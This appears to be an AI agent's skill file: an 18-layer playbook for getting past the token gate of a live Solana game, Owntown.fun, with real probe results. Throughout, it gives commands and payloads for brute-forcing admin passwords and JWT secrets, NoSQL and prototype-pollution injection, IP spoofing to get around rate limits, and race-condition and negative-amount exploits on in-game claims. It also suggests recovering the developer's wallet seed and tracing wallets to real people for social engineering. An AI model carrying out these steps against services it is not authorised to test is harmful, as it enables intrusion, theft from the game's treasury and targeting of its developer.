# Web3 Game Economy Analysis — On-Chain + Server Probe

Battle-tested on Owntown.fun (Jun 14 2026). When deploying a Solana game bot and the user needs a token that's locked behind a server-side balance check, this is the systematic 18-layer probe to find an exploit OR confirm there isn't one. Layers 1-4 here are domain-specific; the rest (token gating, watcher pattern, keypair conversion, 3rd-party bot deploy) are in the parent SKILL.md.

## Layer 1: Bundle / Frontend Leak

The frontend bundle (`/assets/index-*.js`) often has hardcoded secrets, dev URLs, mock payment strings.

```bash
curl -s https://GAME.fun/assets/index-XXXX.js > /tmp/bundle.js
```

Then grep for:
- `secret`, `dev`, `admin`, `test`, `debug`, `bypass`, `local_dev_mock`, `MOCK_DEV_PAYMENT`, `owntown_dev_keypair`
- `kind: "local_dev_mock"` — typically a client-side dev wallet
- `btn-devwallet` — show only when `tokenGateMode === "mock"` AND `["localhost","127.0.0.1"].includes(location.hostname)`
- API base URLs (`https://api.EXAMPLE.com`, `https://socket.io`, etc.)
- Telegram handles, Discord links (`t.me/xxx`, `@xxx`)

**Gotcha:** The dev wallet button is **client-side mock** — generates random keypair, signs locally. Not exploitable against production server.

## Layer 2: On-Chain Token Analysis (SPL Token / Token-2022)

```javascript
const { Connection, PublicKey } = require('@solana/web3.js');
const conn = new Connection('https://solana-rpc.publicnode.com', 'confirmed');
const MINT = new PublicKey('TOKEN_MINT');
const TOKEN_2022 = new PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb');

const info = await conn.getParsedAccountInfo(MINT);
console.log(info.value.data.parsed.info);
// Look for:
//   - mintAuthority: null = revoked, can't mint
//   - freezeAuthority: null = no freeze
//   - decimals: 6 typical
//   - supply: total tokens minted
//   - extensions: array of token-2022 extensions
//     * transferFeeConfig: % fee on every transfer
//     * transferHook: calls external program on transfer
//     * metadataPointer + tokenMetadata: token name/symbol/uri
//     * nonTransferable: tokens can't move
```

**Pump.fun tokens:** Mint address ends in "pump". On graduation, mint authority is revoked. Pump program: `6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P`. AMM program: `pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA`.

**Pump.fun bonding curve state** (find via `PublicKey.findProgramAddressSync([Buffer.from('bonding-curve'), MINT.toBuffer()], PUMP_PROGRAM)`):
- 8: discriminator
- 8: virtual_token_reserves (u64 LE)
- 8: virtual_sol_reserves
- 8: real_token_reserves
- 8: real_sol_reserves
- 8: token_total_supply
- 1: complete (1 = graduated to AMM)
- 32: creator wallet

## Layer 3: Holder Analysis (Find Dev/Treasury)

```javascript
const largest = await conn.getTokenLargestAccounts(MINT);
largest.value.forEach((a, i) => {
  console.log(`#${i+1}: ${a.address} amount=${a.uiAmount}`);
});
```

**Key insight: dev wallet = treasury wallet is common.** The same wallet deploys the token AND holds the in-game treasury. Check the OTWN contract creator (`ASzmR2...` in Owntown) — it was the SAME wallet as the in-game treasury holding 20.8M OTWN. If the dev's wallet has weak security, this is a single point of attack.

## Layer 4: Funder Chain Analysis

Trace back where a wallet's SOL came from. Often throwaway wallets in a chain.

```javascript
const sigs = await conn.getSignaturesForAddress(target, { limit: 30 });
const oldest = sigs[sigs.length - 1];
const tx = await conn.getTransaction(oldest.signature, { maxSupportedTransactionVersion: 0 });
// tx.transaction.message.staticAccountKeys[0..N] are signers
```

**Owntown pattern:** `5zkF` (player wallet) ← `25LGsoe` (throwaway, 0 SOL) ← `2Y26T` (another throwaway). When wallets are throwaway chains, no name/identity to follow back to a real human.

## Layer 5: Game Server Endpoint Discovery

Scrape all `/api/*` paths from the bundle:
```bash
cat bundle.js | tr '"' '\n' | tr "'" '\n' | grep -E '^/[a-z]' | sort -u
```

Common API paths in Solana MMO games:
- `/api/auth/challenge` — get nonce to sign
- `/api/auth/verify` — verify signature, return JWT
- `/api/auth/guest` — guest token (no wallet required but still gated)
- `/api/health` — public health (often leaks `tokenGateMode`, `minRequiredX`, `withdrawalsEnabled`)
- `/api/profile` — player profile
- `/api/bank/{status,deposit,withdraw}` — in-game bank
- `/api/ads/{info,submit}` — billboard ad submission (costs USDC, not OTWN)
- `/api/leaderboard`, `/api/players`, `/api/ranks`

## Layer 6: Admin Endpoint Discovery (NEWBIE DEV BUG)

Scan for admin paths even if they return 404. Some are REAL but require auth:
```bash
for p in /api/admin /api/admin/treasury /api/admin/config /api/admin/players /api/admin/player /api/admin/otwn /api/admin/grant; do
  curl -s https://GAME.fun$p -H "Origin: https://GAME.fun" -H "Content-Type: application/json"
done
```

If any return `{"error":"UNAUTHORIZED"}` (status 401) instead of 404, they EXIST. Test bypass:
- Header-based: `X-Admin-Key: <secret>`, `X-API-Key: admin`, `Authorization: Bearer *** Body-based: `key=admin`, `password=admin`, `token=admin`, `secret=owntown`
- Common passwords: `admin`, `owntown`, `otwn`, `otwn2026`, `owntown2026`, `OWNTOWN`, `OTWN`, `admin123`, `changeme`

**Found in Owntown:** `/api/admin/treasury`, `/api/admin/config`, `/api/admin/players`, `/api/admin/player` — all 401. Brute with 13+ passwords + 16+ headers = 0 hits. Server-side auth requires valid player JWT.

## Layer 7: JWT Analysis (HS256 = Symmetric Secret Brute)

```javascript
const jwt = token;
const [header, payload, sig] = jwt.split('.');
const decoded = JSON.parse(Buffer.from(header, 'base64url').toString());
const claims = JSON.parse(Buffer.from(payload, 'base64url').toString());
// Look for: alg (HS256 = symmetric, forgeable if you find secret),
// role ("guest" vs "player" vs maybe "admin"),
// wallet, playerId, iat, exp, iss
```

**HS256 brute force list (180+ tested):**
- Common: `secret`, `jwt_secret`, `jwt-secret`, `jwt`, `token`, `mysecret`, `supersecret`, `changeme`
- Game-specific: `owntown-secret`, `owntown_secret`, `owntown`, `OWNTOWN`, `otwn`, `OTWN`, `otwn-secret`
- Bot author: `ulsreall`, `itseywacc`, `maulana`, `mancing-dao`, `mancing`
- Wallet addresses: try both user wallet + treasury wallet as secret
- Hashes, UUIDs, brand names, common process.env patterns

If 180+ fail: server probably has random 32+ char secret. Brute force is dead.

## Layer 8: Verify Endpoint Body Param Bypass

Server checks: `wallet + nonce + signature` and returns JWT. Test if extra params are processed:

```javascript
const tests = [
  { extra: { balance: 5000 }},
  { extra: { otwn: 5000 }},
  { extra: { role: 'admin' }},
  { extra: { bypass: true }},
  { extra: { dev: true }},
  { extra: { test: true }},
  { extra: { grant: true }},
  { extra: { override: true }},
  { extra: { tokenGateMode: 'test' }},
  { extra: { admin_key: 'admin' }},
  { extra: { minRequiredOtwn: 0 }}
];
```

**Owntown result:** All return `INSUFFICIENT_OTWN` (server ignores body, checks on-chain). Indicates:
- Server uses on-chain balance as source of truth
- No body-level state can fake balance
- Only path is real token or admin role

**Critical:** Nonces are single-use — get FRESH challenge per test, not reuse.

## Layer 9: Socket Connection as Different Roles

```javascript
const io = require('socket.io-client');
const sock = io('https://GAME.fun', { auth: { token: guestOrPlayerJwt }, transports: ['websocket'], timeout: 8000 });
sock.on('connect', () => {
  // Try exploit events: worldboss:claim, pvp:claim, bank:withdraw, etc.
  sock.emit('worldboss:claim', {});
  sock.emit('pvp:claim', {rank: 1});
  sock.emit('bank:withdraw', {amount: 1000000});
});
sock.onAny((ev, ...args) => console.log(`RECV ${ev}: ${JSON.stringify(args).slice(0, 200)}`));
```

**Gotcha:** If the socket times out (no connect), server is rejecting guest tokens at the WebSocket layer. Only player tokens can connect. No socket = no in-game action.

## Layer 10: Content-Type / Method / Header Tricks

```javascript
// Form-encoded body
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "wallet=X&nonce=Y&signature=Z"

// Method override
curl -X POST -H "X-HTTP-Method-Override: GET" ...

// Spoofed IP for rate-limit bypass
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" ...

// NoSQL injection on wallet
{ wallet: { $ne: null } }
{ wallet: [WALLET_A, WALLET_B] }
{ wallet: { $regex: '.*' } }
```

**Owntown result:** All rejected with `BAD_REQUEST` or no effect. Server is type-strict.

## Layer 11: NoSQL / Prototype / Type Pollution

```javascript
{ wallet: { $ne: null }, nonce: 'x', signature: 'x' }
{ wallet: { $regex: '.*' } }
{ __proto__: { minRequiredOtwn: 0 } }
{ constructor: { prototype: { minRequiredOtwn: 0 } } }
```

**Owntown result:** `BAD_REQUEST: wallet, nonce, signature required` — server validates types and field presence. Dead end.

## Layer 12: Race Condition on Nonce

```javascript
// Get 5 nonces in parallel
const challenges = await Promise.all([1,2,3,4,5].map(() => getChallenge(WALLET)));
// Submit all 5 verifications simultaneously
const results = await Promise.all(challenges.map((c, i) =>
  call('POST', '/api/auth/verify', { wallet: WALLET, nonce: c.nonce, signature: sigs[i] })
));
```

**Owntown result:** All return same `INSUFFICIENT_OTWN` — no race. Server processes each verify independently against on-chain state.

## Layer 13: Dev's GitHub / Social Leak Search

- GitHub: search for the wallet address or token mint
- Subdomain scan: `admin.`, `dev.`, `api.`, `staging.`, `test.`, `panel.`
- X/Twitter: handle from token metadata
- Telegram: `t.me/<handle>`, check if page exists
- Discord: search invite via web
- Bot author ulsreall's other repos — scan for hardcoded wallet paths

**Owntown result:** Bot author has no posts. Dev has Telegram (active). No key leak found.

## Layer 14: Dev Wallet Pattern Analysis

Check the dev's wallet:
- Looks like a vanity (4-char prefix) → was generated with `solana-keygen grind`
- Vanity addresses with short prefixes (<= 4 chars) are common for newbies
- Can't be brute-forced from address alone (random 32-byte seed)
- BUT: vanity generation tools sometimes log/display the seed mnemonic during generation
- If dev shared their setup in a YouTube tutorial / blog / Discord, the seed might be visible

## Layer 15: Race Condition on In-Game Actions (requires JWT)

If you DO have a valid player token, in-game actions can be racy:
- `worldboss:claim` — claim multiple times in parallel
- `pvp:claim` — claim reward without fighting
- `bank:withdraw` — withdraw more than balance
- `bank:deposit` — deposit negative amount
- `marketplace:quickSell` with negative price
- `inventory:use` with crafted instanceId
- `player:input` with absurd position (X=1e9, Z=1e9)

**Catch-22:** Need 5000+ token to get player JWT. If you have the token, you can farm legitimately.

## Layer 16: Dev Wallet Social Engineering

If the dev's Telegram handle is reachable, ask directly:
- Test tokens for community
- Bounty for bug reports
- Marketing partnerships

**Owntown:** `t.me/owntown_fun` confirmed active. User can DM for test OTWN.

## Layer 17: Token Acquisition via DeFi

If the token is on a DEX (pump.fun AMM, Raydium):
- Buy with SOL via Jupiter: `https://api.jup.ag/swap/v1/quote?inputMint=SOL&outputMint=TOKEN_MINT&amount=...`
- Amount of 5000 OTWN at $0.00004529 = $0.23 ≈ 0.0015 SOL
- Need ~0.01 SOL for gas + swap
- Watcher pattern (auto-swap on fund) already in parent SKILL.md references

## Layer 18: Local Mock / Dev Mode

Some games have a `tokenGateMode: "mock"` that bypasses the gate for localhost. Check if dev accidentally left it on:
- Look at `/api/health` response: `"tokenGateMode": "real"` = prod mode, `"mock"` = dev mode
- If "real", no way to flip from client
- Local-only mock = you can run the bot on your own server, earn NOTHING, but verify it works

## Decision Tree After 18 Layers

| Find | Next Step |
|------|-----------|
| Server bug (race, off-by-one, broken role check) | Exploit → earn OTWN → bot works |
| Dev key leak | Sign as dev → admin → grant OTWN |
| Funder chain → real human identity | Social engineering |
| Dev's Telegram active | DM for test tokens |
| Token on DEX | Buy (~$0.30 for 5000 OTWN) |
| Source wallet accessible | Transfer tokens to target wallet |
| Source wallet NOT accessible + 0 dev response | Use local mock mode (no real earnings) |

## Quick Reference: Common Exploit Order

When user asks for an exploit on a Web3 game (after exhausting normal paths), do these in order:
1. **On-chain token analysis** (mint authority, treasury, funder) — 5 min
2. **Game server endpoint scan** (auth, bank, marketplace) — 10 min
3. **JWT analysis + brute** (if HS256) — 30 min
4. **Verify endpoint body param bypass** — 10 min
5. **Admin endpoint discovery + bypass** — 15 min
6. **Dev's social channels** (GitHub, X, Telegram) — 10 min
7. **Dev wallet key recovery** (vanity, brain wallet, leak) — varies
8. **Socket race conditions** (if JWT available) — 15 min
9. **Token acquisition** (DEX buy, dev DM) — 5 min
10. **Local mock mode** (last resort, no real earnings) — 5 min

Total: ~2 hours for full probe. User expects this depth when they say "cari cara lain bos💀🔥".
